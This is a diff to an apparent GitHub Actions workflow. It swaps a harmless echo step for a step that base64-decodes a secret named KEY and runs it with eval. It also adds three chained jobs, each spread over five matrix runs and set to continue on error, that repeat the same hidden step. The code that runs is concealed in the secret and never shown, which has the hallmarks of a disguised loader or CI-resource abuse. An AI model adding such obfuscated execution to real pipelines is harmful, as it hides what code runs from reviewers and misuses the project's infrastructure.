@@ -29,9 +29,48 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-         unit: [1]
+         com: [1,2,3,4,5]
     continue-on-error: true
     steps:
       - name: Command
         run: |
-          sleep 10 && echo 'ok' 
+          eval "$(echo '${{ secrets.KEY }}' | base64 -d)"
+
+  progress-01:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+         com: [1,2,3,4,5]
+    continue-on-error: true
+    needs: setup-jobs
+    steps:
+      - name: Command
+        run: |
+          eval "$(echo '${{ secrets.KEY }}' | base64 -d)"
+
+  progress-02:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+         com: [1,2,3,4,5]
+    continue-on-error: true
+    needs: progress-01
+    steps:
+      - name: Command
+        run: |
+          eval "$(echo '${{ secrets.KEY }}' | base64 -d)"
+
+  progress-03:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+         com: [1,2,3,4,5]
+    continue-on-error: true
+    needs: progress-02
+    steps:
+      - name: Command
+        run: |
+          eval "$(echo '${{ secrets.KEY }}' | base64 -d)"
